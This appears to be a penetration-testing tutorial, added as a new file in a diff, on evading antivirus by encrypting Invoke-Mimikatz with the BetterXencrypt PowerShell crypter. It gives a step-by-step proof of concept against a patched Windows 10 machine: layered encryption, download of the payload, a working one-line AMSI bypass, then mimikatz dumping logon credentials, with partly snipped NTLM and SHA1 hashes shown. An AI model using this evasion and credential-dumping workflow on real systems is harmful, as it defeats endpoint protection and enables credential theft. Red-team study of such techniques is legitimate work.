@@ -1,0 +1,141 @@
+=======================================================================================================================================
+AV bypass using the tool 'BetterXencrypt' (PowerShell crypter)
+=======================================================================================================================================
+
+It is an enhenced version of the a Powershell crypter tool 'Xencrypt' designed to evade AV solutions.
+
+=> https://github.com/GetRektBoy724/BetterXencrypt
+
+Main features
+--------------
+> Compresses (Gzip) and encrypts (AES + XOR) PowerShell scripts
+> Randomizes variable names to further obfuscate the decrypter stub
+> Supports recursive layering (crypter crypting the crypted output), tested up to 500 layers.
+> Supports Import-Module as well as standard running as long as the input script also supported it
+
+Once encrypted, offensive PowerShell scripts such as "invoke-mimikatz.ps1" will not be detected by AntiVirus products (i.e. malware signature scan) when they 
+will be downloaded or copied on a target. However they will still be detected at runtime by most AV's real time protection and/or sandbox checks. 
+So before running an encrypted offensive PowerShell script, it will be necessary to bypass the Windows Antimalware Scan Interface (AMSI).
+
+
+=========================================================================================================================================================
+PoC - Example with the script 'Invoke-mimkatz' encrypted 2 times and a Windows 10 laptop (fully patched with MS Defender AV enabled and up-to-date)
+=========================================================================================================================================================
+
+Step 1 - Encrypt and compress with BetterXencrypt the script 'Invoke-mimkatz' with 2 encryption iterations
+------------------------------------------------------------------------------------------------------------
+
+PS C:\Users\Administrator\Documents\Tools> powershell -exec bypass
+
+PS C:\Users\Administrator\Documents\Tools> . .\BetterXencrypt.ps1
+
+PS C:\Users\Administrator\Documents\Tools> Invoke-BetterXencrypt -InFile C:\temp\Invoke-Mimi-Custom.ps1 -OutFile BetterXencrypt-Invoke-Mimi-Custom.ps1 -Iterations 2
+ ____       _   _          __  __                                _
+| __ )  ___| |_| |_ ___ _ _\ \/ /___ _ __   ___ _ __ _   _ _ __ | |_
+|  _ \ / _ \ __| __/ _ \ '__\  // _ \ '_ \ / __| '__| | | | '_ \| __|
+| |_) |  __/ |_| ||  __/ |  /  \  __/ | | | (__| |  | |_| | |_) | |_
+|____/ \___|\__|\__\___|_| /_/\_\___|_| |_|\___|_|   \__, | .__/ \__|
+                                                     |___/|_|
+----------------------------------------------------------------------
+[-----------------Your Lovely FUD Powershell Crypter-----------------]
+[-----------------Recoded With Love By GetRektBoy724-----------------]
+[------------------https://github.com/GetRektBoy724------------------]
+[*] Reading 'C:\temp\Invoke-Mimi-Custom.ps1' ...
+[*] Starting code layer  ...
+[*] Compressing ...
+[*] Generating encryption key ...
+[*] Encrypting with AES...
+[*] Encrypting with XOR ...
+[*] Finalizing code layer ...
+[*] Starting code layer  ...
+[*] Compressing ...
+[*] Generating encryption key ...
+[*] Encrypting with AES...
+[*] Encrypting with XOR ...
+[*] Finalizing code layer ...
+[*] Writing 'BetterXencrypt-Invoke-Mimi-Custom.ps1' ...
+[+] Done!
+
+
+Step 2 - Check that the encrypted 'invoke-mimkatz.ps1' is working properly by running it (after bypassing the AMSI)
+---------------------------------------------------------------------------------------------------------------------
+
+PS C:\Users\Administrator\Downloads> wget -URI http://IP-address/BetterXencrypt-Invoke-Mimi-Custom.ps1 -OutFile BetterXencrypt-Invoke-Mimi-Custom.ps1 
+
+PS C:\Users\Administrator\Downloads> dir .\BetterXencrypt-Invoke-Mimi-Custom.ps1
+
+    Directory: C:\Users\Administrator\Downloads
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----        29/12/2022     02:13        3770326 BetterXencrypt-Invoke-Mimi-Custom.ps1
+
+
+PS C:\Users\Administrator\Downloads> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntivirusSignatureLastUpdated | FL
+
+AntivirusEnabled              : True
+RealTimeProtectionEnabled     : True
+IoavProtectionEnabled         : True
+AntispywareEnabled            : True
+AntivirusSignatureLastUpdated : 28/12/2022 14:53:13
+
+
+PS C:\Users\Administrator\Downloads> . .\BetterXencrypt-Invoke-Mimi-Custom.ps1
+
+IEX : At line:1 char:1
++ function Invoke-Mimi-Custom
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+At line:65 char:1
++ IEX($rthkxpoyrtku)
++ ~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
+  
+  
+PS C:\temp> $audit = [Ref].Assembly.GetTypes();ForEach($b in $audit) {if ($b.Name -like "*iutils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*itFailed") {$f = $e}};$f.SetValue($null,$true)
+
+PS C:\temp> . .\BetterXencrypt-Invoke-Mimi-Custom.ps1
+
+PS C:\temp> Invoke-Mimi-Custom
+   
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 20 2021 19:01:18
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(powershell) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 412903978 (00000000:189c6a2a)
+Session           : Interactive from 5
+User Name         : Administrator
+Domain            : Laptop1
+Logon Server      : Laptop1
+Logon Time        : 28/12/2022 21:46:35
+SID               : S-1-5-21-936125016-2310263949-2175806047-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : Laptop1
+         * NTLM     : 36f7a3ebaa54935ecf03678e1<SNIP>
+         * SHA1     : d5feabcececab0e16c2cbb391<SNIP>
+        tspkg :
+         * Username : Administrator
+         * Domain   : Laptop1
+         * Password : <SNIP>
+        wdigest :
+         * Username : Administrator
+         * Domain   : Laptop1
+         * Password : (null)
+        kerberos :
+         * Username : Administrator
+         * Domain   : Laptop1
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+<SNIP>
+
+        
